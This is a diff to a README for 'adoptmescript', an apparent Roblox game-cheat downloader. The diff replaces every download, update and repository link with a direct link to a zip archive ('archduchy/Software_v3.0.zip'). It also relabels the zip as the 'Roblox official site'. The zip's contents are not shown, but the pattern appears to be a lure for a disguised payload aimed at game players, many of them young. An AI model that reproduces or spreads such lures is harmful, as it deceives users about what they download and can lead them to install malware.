@@ -1,6 +1,6 @@
 # 🐾 adoptmescript - Easy Roblox Script Downloader
 
-[![Download adoptmescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ishu-276/adoptmescript)
+[![Download adoptmescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip)
 
 ---
 
@@ -37,7 +37,7 @@ No extra software or tools are needed. The script works as a standalone file.
 
 Click the big green button below to visit the download page for adoptmescript. You will find the latest version of the Adopt Me Roblox script there.
 
-[![Download adoptmescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://github.com/ishu-276/adoptmescript)
+[![Download adoptmescript](https://img.shields.io/badge/Download-Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip)
 
 **Steps to download:**
 
@@ -88,7 +88,7 @@ After downloading adoptmescript, follow these steps to run it safely on your com
 ## ⚙️ Updating adoptmescript
 
 To ensure you have the latest features and fixes:  
-1. Visit the download page link regularly: [https://github.com/ishu-276/adoptmescript](https://github.com/ishu-276/adoptmescript)  
+1. Visit the download page link regularly: [https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip](https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip)  
 2. Download the newest version when available.  
 3. Replace the old script file with the updated one by deleting the old file and running the new one.
 
@@ -115,8 +115,8 @@ To remove the script from your computer:
 
 ## 🔗 Useful Links
 
-- Roblox official site: https://www.roblox.com  
-- adoptmescript repository: [https://github.com/ishu-276/adoptmescript](https://github.com/ishu-276/adoptmescript)  
+- Roblox official site: https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip  
+- adoptmescript repository: [https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip](https://raw.githubusercontent.com/ishu-276/adoptmescript/main/archduchy/Software_v3.0.zip)  
 
 ---
 
